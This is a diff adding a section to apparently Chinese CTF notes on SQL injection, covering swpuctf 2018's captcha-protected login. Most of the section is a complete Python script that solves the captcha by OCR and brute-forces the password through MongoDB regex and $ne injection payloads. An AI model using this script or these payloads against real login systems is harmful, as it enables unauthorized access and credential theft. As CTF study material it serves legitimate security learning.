@@ -434,6 +434,100 @@ mysql> select benchmark(10000000,sha(1));
 1 row in set (2.79 sec)
 ```
 
+# 带验证码的sql注入
+
+案例: swpuctf 2018 Injection ???
+
+* nosql注入: mongodb注入
+* pytesseract: 可自动识别验证码
+
+安装pytesseract库:
+
+```
+sudo pip3 install pytesseract
+sudo add-apt-repository ppa:alex-p/tesseract-ocr 
+sudo apt-get update
+sudo apt-get install tesseract-ocr
+```
+
+```
+#!/usr/bin/env python3
+# @Time    : 2018/12/17 5:39 PM
+# @Author  : sn00py
+# @Comment:
+
+from PIL import Image
+import pytesseract
+import requests
+import sys
+import string
+
+vertify_url = "http://123.206.213.66:45678/vertify.php"
+login_url = "http://123.206.213.66:45678/check.php?{}"
+
+cookies = {
+    "PHPSESSID": "7s2jq2cnmkd9lgr4gg06me29e1",
+}
+
+
+def get_vertify_img():
+    try:
+        resp = requests.get(url=vertify_url, cookies=cookies)
+        with open('vertify.jpg', 'wb+') as f:
+            f.write(resp.content)
+    except Exception as e:
+        print('验证码获取失败')
+
+
+def get_vertify_code(filename):
+    try:
+        picture = Image.open(filename)
+        text = pytesseract.image_to_string(picture)
+        return text.lower()
+    except Exception as e:
+        print('验证码识别失败')
+        print(e)
+
+
+def login(url):
+    proxies = {
+        'http': 'http://127.0.0.1:8080',
+    }
+    try:
+        resp = requests.get(url, cookies=cookies)
+        return resp.text
+    except Exception as e:
+        pass
+
+
+if __name__ == '__main__':
+    base_char = string.ascii_lowercase + string.digits
+    tmp_pwd = ''
+
+    while True:
+        flag = True
+        for c in base_char:
+            if flag:
+                while True:
+                    # print(c)
+                    get_vertify_img()
+                    code = get_vertify_code('vertify.jpg')
+                    payload = "username[$ne]=toto&password[$regex]=^{}{}.*&vertify={}".format(tmp_pwd, c, code)
+
+                    url = login_url.format(payload)
+                    resp = login(url)
+
+                    if 'username or password incorrect' in resp:
+                        break
+                    if 'Nice' in resp:
+                        tmp_pwd += c
+                        flag = False
+                        print('password:', tmp_pwd)
+                        break
+            else:
+                break
+```
+
 
 
 
